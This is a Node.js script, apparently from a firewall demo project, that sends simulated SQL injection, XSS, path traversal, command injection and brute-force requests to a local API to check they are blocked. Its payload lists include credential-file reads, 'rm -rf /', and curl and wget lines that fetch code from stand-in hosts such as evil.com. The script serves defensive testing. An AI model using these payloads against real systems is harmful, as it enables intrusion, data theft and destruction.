/**
 * SecureShield - Attack Simulation Script
 * Simulates various OWASP Top 10 attacks against the API Gateway to test the WAF.
 * 
 * Usage: node scripts/simulate-attacks.js
 * 
 * MITRE ATT&CK Techniques Tested:
 *   T1190 - Exploit Public-Facing Application (SQLi)
 *   T1059.007 - JavaScript (XSS)
 *   T1083 - File and Directory Discovery (Path Traversal)
 *   T1059 - Command and Scripting Interpreter (Cmd Injection)
 * 
 * 
 * 
 */

const BASE_URL = process.env.TARGET_URL || 'http://localhost:3001';

const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  cyan: '\x1b[36m',
  magenta: '\x1b[35m',
  white: '\x1b[37m',
  dim: '\x1b[2m',
  reset: '\x1b[0m',
  bold: '\x1b[1m',
};

function log(type, message) {
  const icons = {
    attack: `${colors.red}⚔️  [ATTACK]${colors.reset}`,
    success: `${colors.green}✅ [BLOCKED]${colors.reset}`,
    fail: `${colors.yellow}⚠️  [PASSED]${colors.reset}`,
    info: `${colors.cyan}ℹ️  [INFO]${colors.reset}`,
    normal: `${colors.green}📡 [NORMAL]${colors.reset}`,
  };
  console.log(`  ${icons[type] || icons.info} ${message}`);
}

async function sendRequest(method, path, body = null, description = '') {
  try {
    const options = {
      method,
      headers: { 'Content-Type': 'application/json', 'User-Agent': 'SecureShield-Tester/1.0' },
    };
    if (body) options.body = JSON.stringify(body);

    const response = await fetch(`${BASE_URL}${path}`, options);
    const data = await response.json();

    if (response.status === 403) {
      log('success', `${colors.dim}${method} ${path}${colors.reset} → ${colors.red}403 BLOCKED${colors.reset} | ${description}`);
      return { blocked: true, status: response.status, data };
    } else if (response.status === 429) {
      log('success', `${colors.dim}${method} ${path}${colors.reset} → ${colors.yellow}429 RATE LIMITED${colors.reset} | ${description}`);
      return { blocked: true, status: response.status, data };
    } else {
      log(description.includes('[NORMAL]') ? 'normal' : 'fail', `${colors.dim}${method} ${path}${colors.reset} → ${colors.green}${response.status} OK${colors.reset} | ${description}`);
      return { blocked: false, status: response.status, data };
    }
  } catch (err) {
    console.log(`  ${colors.red}❌ [ERROR]${colors.reset} ${description}: ${err.message}`);
    return { error: true, message: err.message };
  }
}

async function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ============================================================
// ATTACK SIMULATIONS
// ============================================================

async function simulateSQLInjection() {
  console.log(`\n${colors.bold}${colors.magenta}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.magenta}  💉 SQL INJECTION ATTACKS (MITRE T1190)${colors.reset}`);
  console.log(`${colors.bold}${colors.magenta}══════════════════════════════════════════════════${colors.reset}\n`);

  const attacks = [
    { method: 'GET', path: "/api/search?q=' OR 1=1 --", desc: "Classic OR 1=1 bypass" },
    { method: 'GET', path: "/api/search?q=admin'--", desc: "Admin bypass with comment" },
    { method: 'GET', path: "/api/search?q=' UNION SELECT * FROM users --", desc: "UNION-based data extraction" },
    { method: 'POST', path: "/api/login", body: { username: "admin' OR '1'='1", password: "anything" }, desc: "Login bypass via SQLi" },
    { method: 'GET', path: "/api/search?q='; DROP TABLE users; --", desc: "Destructive DROP TABLE" },
    { method: 'GET', path: "/api/search?q=' AND SLEEP(5)--", desc: "Time-based blind SQLi" },
    { method: 'GET', path: "/api/data?id=1 UNION ALL SELECT password FROM users", desc: "UNION ALL password dump" },
    { method: 'POST', path: "/api/login", body: { username: "' OR 1=1; EXEC xp_cmdshell('whoami')--", password: "x" }, desc: "SQLi + Command execution" },
  ];

  for (const attack of attacks) {
    await sendRequest(attack.method, attack.path, attack.body, attack.desc);
    await sleep(300);
  }
}

async function simulateXSS() {
  console.log(`\n${colors.bold}${colors.yellow}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.yellow}  🔥 XSS ATTACKS (MITRE T1059.007)${colors.reset}`);
  console.log(`${colors.bold}${colors.yellow}══════════════════════════════════════════════════${colors.reset}\n`);

  const attacks = [
    { method: 'POST', path: "/api/comment", body: { text: "<script>alert('XSS')</script>" }, desc: "Basic script injection" },
    { method: 'POST', path: "/api/comment", body: { text: "<img src=x onerror=alert('XSS')>" }, desc: "Image onerror handler" },
    { method: 'POST', path: "/api/comment", body: { text: "<svg onload=alert('XSS')>" }, desc: "SVG onload event" },
    { method: 'GET', path: "/api/search?q=<script>document.cookie</script>", desc: "Cookie theft via URL" },
    { method: 'POST', path: "/api/comment", body: { text: "javascript:alert(document.cookie)" }, desc: "JavaScript protocol handler" },
    { method: 'POST', path: "/api/comment", body: { text: "<iframe src='https://evil.com'></iframe>" }, desc: "Iframe injection" },
    { method: 'POST', path: "/api/comment", body: { text: "<body onload=eval(atob('YWxlcnQoMSk='))>" }, desc: "Base64 encoded payload" },
  ];

  for (const attack of attacks) {
    await sendRequest(attack.method, attack.path, attack.body, attack.desc);
    await sleep(300);
  }
}

async function simulatePathTraversal() {
  console.log(`\n${colors.bold}${colors.cyan}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}  📂 PATH TRAVERSAL ATTACKS (MITRE T1083)${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}══════════════════════════════════════════════════${colors.reset}\n`);

  const attacks = [
    { method: 'GET', path: "/api/file?name=../../../etc/passwd", desc: "Linux password file access" },
    { method: 'GET', path: "/api/file?name=..\\..\\..\\windows\\system32\\config\\sam", desc: "Windows SAM file access" },
    { method: 'GET', path: "/api/file?name=....//....//etc/shadow", desc: "Double-encoded traversal" },
    { method: 'GET', path: "/api/file?name=%2e%2e%2f%2e%2e%2fetc/passwd", desc: "URL-encoded traversal" },
    { method: 'GET', path: "/api/file?name=../../../proc/self/environ", desc: "Process environment leak" },
    { method: 'GET', path: "/api/file?name=../../../boot.ini", desc: "Windows boot config access" },
  ];

  for (const attack of attacks) {
    await sendRequest(attack.method, attack.path, attack.body, attack.desc);
    await sleep(300);
  }
}

async function simulateCmdInjection() {
  console.log(`\n${colors.bold}${colors.red}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.red}  💀 COMMAND INJECTION ATTACKS (MITRE T1059)${colors.reset}`);
  console.log(`${colors.bold}${colors.red}══════════════════════════════════════════════════${colors.reset}\n`);

  const attacks = [
    { method: 'GET', path: "/api/search?q=test; cat /etc/passwd", desc: "Semicolon command chaining" },
    { method: 'GET', path: "/api/search?q=test | whoami", desc: "Pipe to whoami" },
    { method: 'POST', path: "/api/comment", body: { text: "`rm -rf /`" }, desc: "Backtick command execution" },
    { method: 'POST', path: "/api/comment", body: { text: "$(curl http://evil.com/shell.sh)" }, desc: "Subshell download + execute" },
    { method: 'GET', path: "/api/search?q=; nc -l 4444", desc: "Netcat listener (reverse shell)" },
    { method: 'POST', path: "/api/comment", body: { text: "; wget http://malware.com/payload" }, desc: "Wget malware download" },
  ];

  for (const attack of attacks) {
    await sendRequest(attack.method, attack.path, attack.body, attack.desc);
    await sleep(300);
  }
}

async function simulateNormalTraffic() {
  console.log(`\n${colors.bold}${colors.green}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.green}  📡 NORMAL TRAFFIC (should pass through)${colors.reset}`);
  console.log(`${colors.bold}${colors.green}══════════════════════════════════════════════════${colors.reset}\n`);

  const requests = [
    { method: 'GET', path: "/api/health", desc: "[NORMAL] Health check" },
    { method: 'GET', path: "/api/users", desc: "[NORMAL] Get users list" },
    { method: 'GET', path: "/api/data", desc: "[NORMAL] Get data" },
    { method: 'GET', path: "/api/search?q=cybersecurity", desc: "[NORMAL] Search query" },
    { method: 'POST', path: "/api/login", body: { username: "admin", password: "securepass123" }, desc: "[NORMAL] Valid login" },
    { method: 'POST', path: "/api/comment", body: { text: "Great article about security!" }, desc: "[NORMAL] Post comment" },
    { method: 'GET', path: "/api/file?name=report.pdf", desc: "[NORMAL] Download file" },
  ];

  for (const req of requests) {
    await sendRequest(req.method, req.path, req.body, req.desc);
    await sleep(200);
  }
}

async function simulateBruteForce() {
  console.log(`\n${colors.bold}${colors.yellow}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.yellow}  🔨 BRUTE FORCE / RATE LIMIT TEST${colors.reset}`);
  console.log(`${colors.bold}${colors.yellow}══════════════════════════════════════════════════${colors.reset}\n`);

  log('info', 'Sending 35 rapid requests to trigger rate limiter (limit: 30/min)...');
  
  for (let i = 1; i <= 35; i++) {
    await sendRequest('POST', '/api/login', 
      { username: `user${i}`, password: `pass${i}` },
      `Attempt ${i}/35`
    );
    await sleep(50);
  }
}

// ============================================================
// MAIN EXECUTION
// ============================================================

async function main() {
  console.log(`
${colors.bold}${colors.cyan}
  ╔══════════════════════════════════════════════════════╗
  ║                                                      ║
  ║   🛡️  SecureShield - Attack Simulation Suite          ║
  ║   Testing WAF against OWASP Top 10 Attacks           ║
  ║                                                      ║
  ║   Target: ${BASE_URL}                       ║
  ║   MITRE ATT&CK Techniques: T1190, T1059, T1083      ║
  ║                                                      ║
  ╚══════════════════════════════════════════════════════╝
${colors.reset}`);

  // First, send normal traffic
  await simulateNormalTraffic();
  await sleep(500);

  // Run attack simulations
  await simulateSQLInjection();
  await sleep(500);

  await simulateXSS();
  await sleep(500);

  await simulatePathTraversal();
  await sleep(500);

  await simulateCmdInjection();
  await sleep(500);

  // Brute force (rate limiting)
  await simulateBruteForce();

  // Final summary
  console.log(`\n${colors.bold}${colors.cyan}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}  📊 SIMULATION COMPLETE${colors.reset}`);
  console.log(`${colors.bold}${colors.cyan}══════════════════════════════════════════════════${colors.reset}`);
  console.log(`\n  ${colors.dim}Check the dashboard at http://localhost:5173 to see results.${colors.reset}\n`);

  // Fetch final stats
  try {
    const res = await fetch(`${BASE_URL}/api/dashboard/stats`);
    const { data } = await res.json();
    console.log(`  ${colors.bold}Final Stats:${colors.reset}`);
    console.log(`    Total Requests:  ${colors.cyan}${data.totalRequests}${colors.reset}`);
    console.log(`    Blocked:         ${colors.red}${data.blockedRequests}${colors.reset}`);
    console.log(`    Block Rate:      ${colors.yellow}${data.blockRate}${colors.reset}`);
    console.log(`    Threat Level:    ${data.threatLevel.level}`);
    console.log(`    SQLi Blocked:    ${data.sqliAttempts}`);
    console.log(`    XSS Blocked:     ${data.xssAttempts}`);
    console.log(`    Path Traversal:  ${data.pathTraversalAttempts}`);
    console.log(`    Cmd Injection:   ${data.cmdInjectionAttempts}`);
    console.log(`    Rate Limited:    ${data.rateLimitBlocks}`);
    console.log('');
  } catch (err) {
    // Stats fetch may fail if server is not running
  }
}

main().catch(console.error);
